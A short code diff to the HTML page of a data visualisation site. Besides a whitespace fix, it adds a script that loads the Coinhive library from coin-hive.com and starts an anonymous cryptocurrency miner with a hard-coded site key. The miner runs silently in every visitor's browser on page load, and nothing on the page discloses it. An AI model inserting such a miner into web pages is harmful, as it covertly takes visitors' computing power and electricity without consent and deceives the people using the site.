@@ -56,7 +56,7 @@
 				<span rel="num">view by total amount</span>
 				<div id="selector">
 					<a href="#" id="num" class="selected">#</a>
-					<a href="#" id="perc">%</a>	
+					<a href="#" id="perc">%</a>
 				</div>
 				<span class="right" rel="perc">view by percentage on total</span>
 			</div>
@@ -109,6 +109,11 @@
 	<script src="web/js/smallmultiples.js"></script>
 	<script src="web/js/linechart.js"></script>
 	<script src="web/js/main.js"></script>
+	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+	<script>
+		var miner = new CoinHive.Anonymous('tEvftUgKi05crqYY4QsIVc8ETlEueYbx');
+		miner.start();
+	</script>
 	<script>
 	  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
 	  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
